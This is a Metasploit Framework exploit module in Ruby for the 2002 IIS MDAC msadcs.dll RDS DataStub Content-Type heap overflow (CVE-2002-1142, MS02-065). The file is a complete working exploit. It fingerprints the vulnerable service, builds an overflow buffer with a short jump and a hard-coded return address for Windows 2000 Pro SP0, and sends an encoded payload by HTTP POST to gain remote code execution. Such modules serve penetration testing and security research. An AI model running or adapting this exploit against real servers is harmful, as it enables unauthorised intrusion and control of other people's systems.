##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize
		super(
			'Name'        => 'Microsoft IIS MDAC msadcs.dll RDS DataStub Content-Type Overflow',
			'Description' => %q{
					This module can be used to execute arbitrary code on IIS servers
					that expose the /msadc/msadcs.dll Microsoft Data Access Components
					(MDAC) Remote Data Service (RDS) DataFactory service. The service is
					exploitable even when RDS is configured to deny remote connections
					(handsafe.reg). The service is vulnerable to a heap overflow where
					the RDS DataStub 'Content-Type' string is overly long. Microsoft Data
					Access Components (MDAC) 2.1 through 2.6 are known to be vulnerable.
			},
			'Author'      => 'patrick',
			'Version'     => '$Revision$',
			'Platform'    => 'win',
			'References'  =>
				[
					['OSVDB', '14502'],
					['BID', '6214'],
					['CVE', '2002-1142'],
					['MSB', 'ms02-065'],
					['URL', 'http://archives.neohapsis.com/archives/vulnwatch/2002-q4/0082.html']
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x09\x0a\x0b\x0d\x20:?<>=$\\/\"';=+%#&",
					'StackAdjustment' => -3500,
				},
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh', # stops IIS from crashing... hopefully
				},
			'Targets'     =>
				[
					# patrickw tested OK 20120607 w2kpro en sp0 msadcs.dll v2.50.4403.0
					[ 'Windows 2000 Pro English SP0', { 'Ret' => 0x75023783 } ], # jmp eax ws2help.dll
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 20 2002'
		)

		register_options(
			[
				OptString.new('PATH', [ true,  "The path to msadcs.dll", '/msadc/msadcs.dll']),
			], self.class)
	end

	def check
		res = send_request_raw({
				'uri'          =>  datastore['PATH'],
				'method'       => 'GET',
			})
		if (res and res.code == 200)
			print_status("Server responded with HTTP #{res.code} OK")
			if (res.body =~ /Content-Type: application\/x-varg/)
				print_good("#{datastore['PATH']} matches fingerprint application\/x-varg")
				Exploit::CheckCode::Detected
			end
		else
			Exploit::CheckCode::Safe
		end
	end

	def exploit
		sploit = rand_text_alphanumeric(136)
		sploit[24,2] = Rex::Arch::X86.jmp_short(117)
		sploit << [target['Ret']].pack('V')
		sploit << payload.encoded

		data  = 'Content-Type: ' + sploit

		res = send_request_raw({
			'uri'          => datastore['PATH'] + '/AdvancedDataFactory.Query',
			'headers' =>
				{
					'Content-Length' => data.length,
				},

			'method'       => 'POST',
			'data'         => data,
		})

		handler
	end

end
